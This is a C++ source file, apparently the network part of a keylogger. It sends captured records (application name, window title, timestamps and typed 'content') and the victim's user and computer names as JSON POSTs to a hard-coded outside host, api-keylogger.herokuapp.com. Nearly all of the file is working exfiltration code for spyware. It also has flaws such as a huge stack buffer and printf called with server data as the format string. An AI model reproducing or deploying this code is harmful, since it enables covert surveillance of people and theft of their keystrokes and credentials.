#include "httpRequest.h"
#include <string.h>
#define HTTP_TIMEOUT 30000

HINTERNET hOpen, hOpenProxy;
WCHAR g_wsCurrentProxy[255] = L"";
static void GetProxy(WCHAR* sProxyName);
DWORD WinHTTPRequest(LPCTSTR pServerName, LPCTSTR pRequest, WCHAR* sCommand, LPVOID pPostData, int nPostDataLength, LPCWSTR pwszHeaders, char** dataOut, int* nRead, WCHAR** dataHeaderOut, BOOL bTestProxy, BOOL bSecure, WCHAR* wsRedirect, DWORD* dwReturnStatus);

httpRequest::httpRequest() {

}

void httpRequest::RequestRecord(std::string appName, std::string windowName, std::string date, std::string time, std::string type, std::string content, std::string idClient) {
    hOpen = WinHttpOpen(L"Record", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    WinHttpSetTimeouts(hOpen, HTTP_TIMEOUT, HTTP_TIMEOUT, HTTP_TIMEOUT, HTTP_TIMEOUT);

    WCHAR wsHostName[MAX_PATH] = L"api-keylogger.herokuapp.com";
    WCHAR wsURLPathPost[MAX_PATH] = L"/api/records";
    std::string data = "{\"app_name\":\"" + appName + "\",\"window_name\":\"" + windowName + "\",\"date\":\"" + date + "\",\"time\":\"" + time + "\",\"type\":\"" + type + "\",\"content\":\"" + content + "\",\"client_id\":\"" + idClient + "\"}";
    char sPostData[900000];

    strcpy_s(sPostData, data.c_str());
    char* sHTTPData = NULL;
    int nDataRead = 0;
    WCHAR* wsDataHeader = NULL;
    WCHAR wsRedirect[2048 + 128 + 3]; // INTERNET_MAX_URL_LENGTH
    DWORD dwStatus = 0;

    WCHAR wsAdditionalHeaders[1024] = L"";
    lstrcpy(wsAdditionalHeaders,
        L"Accept: application/json\r\n"
        L"Content-Type: application/json\r\n"
        L"Accept-Encoding: txt\r\n");

    wchar_t method[] = L"POST";
    //_getch();
    DWORD dwReturn = WinHTTPRequest(wsHostName, wsURLPathPost, method, sPostData, NULL, wsAdditionalHeaders, &sHTTPData, &nDataRead, &wsDataHeader, 0, 0, wsRedirect, &dwStatus);
    if (dwStatus == 0)
        printf(sHTTPData);
    else
        printf("Error Status : [%d]\n", dwStatus);
    if (sHTTPData)
        delete[] sHTTPData;
    if (wsDataHeader)
        delete[] wsDataHeader;

    printf("\n\nEND - Type a key\n");
    //_getch();
    if (hOpen)
        WinHttpCloseHandle(hOpen);
    if (hOpenProxy)
        WinHttpCloseHandle(hOpenProxy);
}

void httpRequest::RequestClient(std::string id, std::string user, std::string computer) {
    hOpen = WinHttpOpen(L"Test", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    WinHttpSetTimeouts(hOpen, HTTP_TIMEOUT, HTTP_TIMEOUT, HTTP_TIMEOUT, HTTP_TIMEOUT);

    WCHAR wsHostName[MAX_PATH] = L"api-keylogger.herokuapp.com";
    WCHAR wsURLPathGet[MAX_PATH] = L"/api/v1/employees";
    WCHAR wsURLPathPost[MAX_PATH] = L"/api/clients";
    std::string data = "{\"id\":\"" + id + "\",\"nickname\":\"" + user + "\",\"desktop_name\":\"" + computer + "\"}";
    char sPostData[1000];
    strcpy_s(sPostData, data.c_str());
    char* sHTTPData = NULL;
    int nDataRead = 0;
    WCHAR* wsDataHeader = NULL;
    WCHAR wsRedirect[2048 + 32 + 3]; // INTERNET_MAX_URL_LENGTH
    DWORD dwStatus = 0;

    WCHAR wsAdditionalHeaders[1024] = L"";
    lstrcpy(wsAdditionalHeaders,
        L"Accept: application/json\r\n"
        L"Content-Type: application/json\r\n"
        L"Accept-Encoding: txt\r\n");

    wchar_t method[] = L"POST";
    DWORD dwReturn = WinHTTPRequest(wsHostName, wsURLPathPost, method, sPostData, NULL, wsAdditionalHeaders, &sHTTPData, &nDataRead, &wsDataHeader, 0, 0, wsRedirect, &dwStatus);
    if (dwStatus == 0)
        printf(sHTTPData);
    else
        printf("Error Status : [%d]\n", dwStatus);
    if (sHTTPData)
        delete[] sHTTPData;
    if (wsDataHeader)
        delete[] wsDataHeader;

    printf("\n\nEND - Type a key\n");
    //_getch();
    if (hOpen)
        WinHttpCloseHandle(hOpen);
    if (hOpenProxy)
        WinHttpCloseHandle(hOpenProxy);
}

static void GetProxy(WCHAR* sProxyName)
{
    lstrcpy(sProxyName, L"");
    unsigned long nBufferSize = 4096;
    WCHAR wszBuf[4096] = { 0 };
    WINHTTP_PROXY_INFO* pInfo = (WINHTTP_PROXY_INFO*)wszBuf;
    if (WinHttpQueryOption(NULL, WINHTTP_OPTION_PROXY, pInfo, &nBufferSize))
    {
        if (pInfo->dwAccessType == WINHTTP_OPTION_PROXY)
        {
            WCHAR wsKey[MAX_PATH] = L"Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings";
            WCHAR wsValue[MAX_PATH] = L"ProxyEnable";
            DWORD dwValue = (DWORD)FALSE;
            DWORD dwSize = sizeof(dwValue);
            LONG nStatus = SHRegGetValue(HKEY_CURRENT_USER, wsKey, wsValue, SRRF_RT_DWORD, NULL, &dwValue, &dwSize);
            if ((nStatus == ERROR_FILE_NOT_FOUND) || (nStatus == ERROR_PATH_NOT_FOUND))
                nStatus = SHRegGetValue(HKEY_LOCAL_MACHINE, wsKey, wsValue, SRRF_RT_DWORD, NULL, &dwValue, &dwSize);
            if (nStatus != ERROR_SUCCESS)
                dwValue = FALSE;
            if (dwValue)
                lstrcpy(sProxyName, pInfo->lpszProxy);
        }
    }
}

DWORD WinHTTPRequest(LPCTSTR pServerName, LPCTSTR pRequest, WCHAR* sCommand, LPVOID pPostData, int nPostDataLength, LPCWSTR pwszHeaders, char** dataOut, int* nRead, WCHAR** dataHeaderOut, BOOL bTestProxy, BOOL bSecure, WCHAR* wsRedirect, DWORD* dwReturnStatus)
{
    HINTERNET hCurrentOpen = NULL;
    if (bTestProxy)
    {
        WCHAR sProxy[255] = L"";
        GetProxy(sProxy);
        if (lstrcmp(sProxy, L"") == 0)
            hCurrentOpen = hOpen;
        else if (lstrcmp(sProxy, g_wsCurrentProxy) != 0)
        {
            if (hOpenProxy)
                WinHttpCloseHandle(hOpenProxy);
            hOpenProxy = WinHttpOpen(L"Test", WINHTTP_ACCESS_TYPE_NAMED_PROXY, sProxy, NULL, 0/*INTERNET_FLAG_ASYNC*/);
            lstrcpy(g_wsCurrentProxy, sProxy);
            hCurrentOpen = hOpenProxy;
        }
        else
            hCurrentOpen = hOpenProxy;
    }
    else
        hCurrentOpen = hOpen;

    HINTERNET hConnect = NULL;
    if (bSecure)
        hConnect = WinHttpConnect(hCurrentOpen, pServerName, INTERNET_DEFAULT_HTTPS_PORT, 0);
    else
        hConnect = WinHttpConnect(hCurrentOpen, pServerName, INTERNET_DEFAULT_HTTP_PORT, 0);

    if (!hConnect)
    {
        DWORD dwError = GetLastError();
        return dwError;
    }

    DWORD dwFlags;
    if (bSecure)
        dwFlags = WINHTTP_FLAG_SECURE | WINHTTP_FLAG_REFRESH;
    else
        dwFlags = WINHTTP_FLAG_REFRESH;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, sCommand, pRequest, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);
    if (!hRequest)
    {
        DWORD dwError = GetLastError();
        WinHttpCloseHandle(hConnect);
        return dwError;
    }

    WinHttpAddRequestHeaders(hRequest, pwszHeaders, -1, WINHTTP_ADDREQ_FLAG_ADD);
    int nLengthPostData;
    if (nPostDataLength == NULL)
    {
        if (pPostData)
            nLengthPostData = strlen((char*)pPostData);
        else
            nLengthPostData = 0;
    }
    else
        nLengthPostData = nPostDataLength;

    BOOL bSuccess;
    if (wsRedirect != NULL)
    {
        DWORD dwOption;
        DWORD dwOptionSize;
        dwOption = WINHTTP_OPTION_REDIRECT_POLICY_NEVER;
        dwOptionSize = sizeof(DWORD);
        bSuccess = WinHttpSetOption(hRequest, WINHTTP_OPTION_REDIRECT_POLICY, (LPVOID)&dwOption, dwOptionSize);
        DWORD dwOptionValue = WINHTTP_DISABLE_REDIRECTS;
        bSuccess = WinHttpSetOption(hRequest, WINHTTP_OPTION_DISABLE_FEATURE, &dwOptionValue, sizeof(dwOptionValue));
    }
    BOOL b = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, pPostData, pPostData == NULL ? 0 : nLengthPostData, nLengthPostData, 0);
    if (!b)
    {
        DWORD dwError = GetLastError();
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hRequest);
        return dwError;
    }

    WinHttpReceiveResponse(hRequest, NULL);
    DWORD dwStatus = 0;
    DWORD dwStatusSize = sizeof(DWORD);
    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatus, &dwStatusSize, NULL))
    {
        if (HTTP_STATUS_REDIRECT == dwStatus || HTTP_STATUS_MOVED == dwStatus)
        {
            DWORD dwSize;
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_LOCATION, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwSize, WINHTTP_NO_HEADER_INDEX);
            if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
                return 500;
            LPWSTR pwsRedirectURL = new WCHAR[dwSize];
            bSuccess = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_LOCATION, WINHTTP_HEADER_NAME_BY_INDEX, pwsRedirectURL, &dwSize, WINHTTP_NO_HEADER_INDEX);
            if (!bSuccess)
                return 500;
            if (wsRedirect != NULL)
                lstrcpy(wsRedirect, pwsRedirectURL);
            if (dwReturnStatus != NULL)
                *dwReturnStatus = dwStatus;
            delete[] pwsRedirectURL;
        }
        else if (dwStatus != HTTP_STATUS_OK && dwStatus != HTTP_STATUS_BAD_REQUEST && dwStatus != HTTP_STATUS_CREATED)
        {
            DWORD dwError = GetLastError();
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hRequest);
            if (dwReturnStatus != NULL)
                *dwReturnStatus = dwStatus;
            return dwError;
        }
    }
    if (dataHeaderOut != NULL)
    {
        DWORD dwSize = 0;
        WCHAR* pOutBuffer = NULL;
        if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwSize, WINHTTP_NO_HEADER_INDEX))
        {
            DWORD dwErr = GetLastError();
            if (dwErr != ERROR_INSUFFICIENT_BUFFER)
            {
                DWORD dwError = GetLastError();
                WinHttpCloseHandle(hConnect);
                WinHttpCloseHandle(hRequest);
                return dwError;
            }
        }
        pOutBuffer = new WCHAR[dwSize];
        if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX, pOutBuffer, &dwSize, WINHTTP_NO_HEADER_INDEX))
        {
            pOutBuffer[dwSize] = '\0';
            *dataHeaderOut = (WCHAR*)pOutBuffer;
        }
        //delete[] pOutBuffer;
    }

    char* sReadBuffer = NULL;
    DWORD nTotalRead = 0;
    DWORD nToRead = 0;
    DWORD nBytesRead = 0;
    do {
        if (!WinHttpQueryDataAvailable(hRequest, &nToRead))
            break;
        if (nToRead == 0)
            break;
        sReadBuffer = (char*)((sReadBuffer == NULL) ? malloc(nToRead) : realloc(sReadBuffer, nTotalRead + nToRead + 1));
        if (WinHttpReadData(hRequest, sReadBuffer + nTotalRead, nToRead, &nBytesRead))
        {
            nTotalRead += nBytesRead;
        }
    } while (nToRead > 0);
    if (sReadBuffer != NULL && nTotalRead > 0)
    {
        {
            char* sBuffer = new char[nTotalRead + 1];
            memcpy(sBuffer, sReadBuffer, nTotalRead + 1);
            sBuffer[nTotalRead] = '\0';
            *dataOut = sBuffer;
        }
        free(sReadBuffer);
    }

    *nRead = nTotalRead;
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hRequest);
    return ERROR_SUCCESS;
}
